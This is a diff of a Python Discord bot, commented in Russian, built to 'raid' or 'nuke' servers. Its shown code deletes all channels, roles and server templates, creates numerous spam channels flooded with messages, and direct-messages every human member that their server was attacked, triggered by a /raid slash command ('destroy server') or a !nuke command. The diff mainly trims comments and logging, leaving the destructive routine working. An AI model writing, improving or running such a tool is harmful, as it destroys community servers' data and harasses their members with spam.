@@ -21,19 +21,9 @@ CONFIG = {
     "dm_message": "Твой сервер {guild_name} был атакован.",
 }
 
-# ========= ВСТАВЬ СЮДА ID (ТОЛЬКО ЧИСЛА, БЕЗ КАВЫЧЕК) =========
 BLOCKED_GUILDS = [
-    123456789012345678,  # ← замени на реальный ID
-    # 987654321098765432,  # ← второй сервер (раскомментируй если нужно)
+    # 123456789012345678,
 ]
-
-def get_token():
-    if os.path.exists(TOKEN_FILE):
-        with open(TOKEN_FILE, 'r') as f:
-            return f.read().strip()
-    return input("Вставь токен: ")
-
-TOKEN = get_token()
 
 intents = discord.Intents.default()
 intents.members = True
@@ -43,53 +33,43 @@ intents.messages = True
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 async def raid_actions(guild: discord.Guild):
-    # ========= ПРОВЕРКА БЛОКИРОВКИ В САМОМ НАЧАЛЕ =========
     if guild.id in BLOCKED_GUILDS:
-        print(f"\n[БЛОКИРОВКА] Сервер {guild.name} (ID: {guild.id}) в чёрном списке. Рейд отменён.")
+        print(f"[БЛОК] Сервер {guild.name} в чёрном списке")
         return
 
     print(f"\n=== РЕЙД НА {guild.name} (ID: {guild.id}) ===")
 
-    # 1. УДАЛЕНИЕ КАНАЛОВ
     print("[1/5] Удаление каналов...")
     deleted = 0
-    total_channels = len(guild.channels)
     for channel in guild.channels:
         try:
             await channel.delete()
             deleted += 1
-            print(f"    Удалён канал [{deleted}/{total_channels}]")
             await asyncio.sleep(CONFIG['delay_delete'])
         except Exception:
             pass
-    print(f"[+] Удалено каналов: {deleted}/{total_channels}")
+    print(f"[+] Удалено каналов: {deleted}")
 
-    # 2. УДАЛЕНИЕ РОЛЕЙ
     print("[2/5] Удаление ролей...")
     roles_deleted = 0
-    roles_list = [r for r in guild.roles if r.name != "@everyone"]
-    total_roles = len(roles_list)
-    for role in roles_list:
-        try:
-            await role.delete()
-            roles_deleted += 1
-            print(f"    Удалена роль [{roles_deleted}/{total_roles}]")
-            await asyncio.sleep(0.2)
-        except Exception:
-            pass
-    print(f"[+] Удалено ролей: {roles_deleted}/{total_roles}")
+    for role in guild.roles:
+        if role.name != "@everyone":
+            try:
+                await role.delete()
+                roles_deleted += 1
+                await asyncio.sleep(0.2)
+            except Exception:
+                pass
+    print(f"[+] Удалено ролей: {roles_deleted}")
 
-    # 3. УДАЛЕНИЕ ШАБЛОНОВ
     print("[3/5] Удаление шаблонов...")
     templates_deleted = 0
     try:
         templates = await guild.templates()
-        total_templates = len(templates)
         for template in templates:
             try:
                 await template.delete()
                 templates_deleted += 1
-                print(f"    Удалён шаблон [{templates_deleted}/{total_templates}]: {template.name}")
                 await asyncio.sleep(0.3)
             except Exception:
                 pass
@@ -97,43 +77,35 @@ async def raid_actions(guild: discord.Guild):
         pass
     print(f"[+] Удалено шаблонов: {templates_deleted}")
 
-    # 4. СОЗДАНИЕ КАНАЛОВ И СПАМ
-    print(f"[4/5] Создание {CONFIG['channels_to_create']} каналов и спам...")
+    print(f"[4/5] Создание {CONFIG['channels_to_create']} каналов...")
     created = 0
     for i in range(CONFIG['channels_to_create']):
         try:
             new_ch = await guild.create_text_channel(f"{CONFIG['channel_name']}-{i+1}")
             created += 1
-            print(f"    Создан канал [{created}/{CONFIG['channels_to_create']}]: {new_ch.name}")
             for j in range(CONFIG['spam_per_channel']):
                 try:
                     await new_ch.send(CONFIG['spam_message'])
-                    if (j + 1) % 10 == 0:
-                        print(f"        Спам в {new_ch.name}: {j+1}/{CONFIG['spam_per_channel']}")
                     await asyncio.sleep(CONFIG['delay_spam'])
                 except Exception:
                     break
             await asyncio.sleep(CONFIG['delay_create'])
         except Exception:
             pass
-    print(f"[+] Создано каналов: {created}/{CONFIG['channels_to_create']}")
+    print(f"[+] Создано каналов: {created}")
 
-    # 5. РАССЫЛКА DM
     if CONFIG['dm_everyone']:
         print("[5/5] Рассылка DM...")
         dm_sent = 0
-        members = [m for m in guild.members if not m.bot]
-        total_members = len(members)
-        for member in members:
-            try:
-                await member.send(CONFIG['dm_message'].format(guild_name=guild.name))
-                dm_sent += 1
-                if dm_sent % 50 == 0:
-                    print(f"    DM отправлено: {dm_sent}/{total_members}")
-                await asyncio.sleep(0.2)
-            except Exception:
-                pass
-        print(f"[+] DM разослано: {dm_sent}/{total_members}")
+        for member in guild.members:
+            if not member.bot:
+                try:
+                    await member.send(CONFIG['dm_message'].format(guild_name=guild.name))
+                    dm_sent += 1
+                    await asyncio.sleep(0.2)
+                except Exception:
+                    pass
+        print(f"[+] DM разослано: {dm_sent}")
 
     print("\n=== РЕЙД ЗАВЕРШЁН ===")
 
@@ -141,8 +113,8 @@ async def raid_actions(guild: discord.Guild):
 async def on_ready():
     print(f"\n[+] Бот {bot.user} активен! Серверов: {len(bot.guilds)}")
     for g in bot.guilds:
-        blocked_mark = " 🔒 (заблокирован)" if g.id in BLOCKED_GUILDS else ""
-        print(f"    - {g.name} (ID: {g.id}){blocked_mark}")
+        blocked = " 🔒" if g.id in BLOCKED_GUILDS else ""
+        print(f"    - {g.name} (ID: {g.id}){blocked}")
     try:
         synced = await bot.tree.sync()
         print(f"[+] Синхронизировано команд: {len(synced)}")
@@ -152,21 +124,18 @@ async def on_ready():
 
 @bot.tree.command(name="raid", description="Уничтожить сервер")
 async def raid(interaction: discord.Interaction):
-    await interaction.response.send_message("🚀 **RAID STARTED**", ephemeral=False)
+    await interaction.response.send_message("🚀 RAID STARTED", ephemeral=False)
     await raid_actions(interaction.guild)
 
 @bot.command(name="nuke")
 @commands.has_permissions(administrator=True)
 async def nuke_prefix(ctx):
-    await ctx.send("⚠️ **NUKE STARTED**")
+    await ctx.send("⚠️ NUKE STARTED")
     await raid_actions(ctx.guild)
 
 if __name__ == "__main__":
-    if not TOKEN:
-        print("[FATAL] Нет токена!")
-    else:
-        try:
-            bot.run(TOKEN)
-        except KeyboardInterrupt:
-            print("\n[!] Остановка бота")
-            sys.exit(0)
+    try:
+        bot.run(TOKEN)
+    except KeyboardInterrupt:
+        print("\n[!] Остановка бота")
+        sys.exit(0)
